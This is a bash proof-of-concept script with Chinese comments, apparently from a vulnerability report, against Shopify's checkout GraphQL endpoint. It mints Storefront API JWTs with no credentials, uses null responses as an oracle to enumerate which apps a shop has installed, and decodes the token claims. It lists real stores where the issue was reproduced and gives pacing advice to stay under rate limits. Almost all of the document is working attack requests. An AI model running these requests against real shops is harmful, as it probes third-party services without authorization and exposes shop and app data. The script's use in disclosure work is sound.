#!/usr/bin/env bash
# Shopify /checkouts/unstable/graphql :: Query.extensionApiTokens 未认证铸造 Storefront API JWT
# 实测：2026-11-11 task#7（www / collect 两独立店）+ task#9（retro-refresh.com）均复现；
#       零 Cookie、零 checkout 会话头、零 build-id。
# 注意：单线程、请求间隔 >=3s；实测约 30+ 请求触发 429。
set -u

SHOP="${1:-https://<shop>}"          # 例：https://www.example.com（Shopify 托管店自定义域）
APP_ID="${2:-gid://shopify/App/3373963}"   # gid://shopify/App/<纯数字>
EP="${SHOP%/}/checkouts/unstable/graphql"

hr(){ printf '\n===== %s =====\n' "$1"; }

hr "1) 零凭据铸造（无 Cookie / 无 session token / 无 build-id）"
curl -sk -X POST "$EP" \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json' \
  --data "{\"query\":\"query E(\$appId:ID!){extensionApiTokens(appId:\$appId){storefrontApi{token expiresAt}}}\",\"variables\":{\"appId\":\"${APP_ID}\"}}"
echo

hr "2) 判据对照：同端点其它字段强制会话（应返回 INVALID_SESSION_TOKEN）"
curl -sk -X POST "$EP" \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json' \
  --data '{"query":"{session{__typename}}"}'
echo

hr "3) 安装存在性 oracle：未安装 appId 应返回 null"
curl -sk -X POST "$EP" \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json' \
  --data '{"query":"query E($appId:ID!){extensionApiTokens(appId:$appId){storefrontApi{token expiresAt}}}","variables":{"appId":"gid://shopify/App/999999999"}}'
echo

hr "4) JWT claims 解码（export TOKEN=<第1步的 token> 后运行）"
python3 - <<'EOF'
import base64, json, os
tok = os.environ.get('TOKEN', '').strip()
if not tok:
    raise SystemExit('先 export TOKEN=<第1步的 token>')
p = tok.split('.')[1]
p += '=' * (-len(p) % 4)
claims = json.loads(base64.urlsafe_b64decode(p))
# 期望：iss=shopify, sub=<appId 数字>, sid=<shopId>, cid=580111, exp-iat=3600
print(json.dumps(claims, indent=2, ensure_ascii=False))
EOF

hr "5) 影响上限核验：铸出的 token 不应被公开 Storefront API 接受（预期 401 UNAUTHORIZED）"
cat <<'NOTE'
TOKEN='<第1步 token>'
curl -sk -X POST "${SHOP%/}/api/graphql" \
  -H 'Content-Type: application/json' \
  -H "X-Shopify-Storefront-Access-Token: ${TOKEN}" \
  --data '{"query":"{shop{name myshopifyDomain}}"}'
# 换 Authorization: Bearer / myshopify 主机 / 2026-04、2026-07、unstable 版本同样应 401。
# 若无 token 匿名同查询返回 200 —— 用来排除“该店 Storefront API 整体不可用”。
NOTE

# ---- 判据汇总 ----
# 成立：第1步 200 且返回 storefrontApi.token；第2步同端点报 INVALID_SESSION_TOKEN；第3步 null。
# 非漏洞：第1步即报 INVALID_SESSION_TOKEN / 字段不在 schema / 401。
# 影响边界：token 可被铸造 + 安装枚举，但公开 Storefront API 拒收（401），数据面消费方未证实。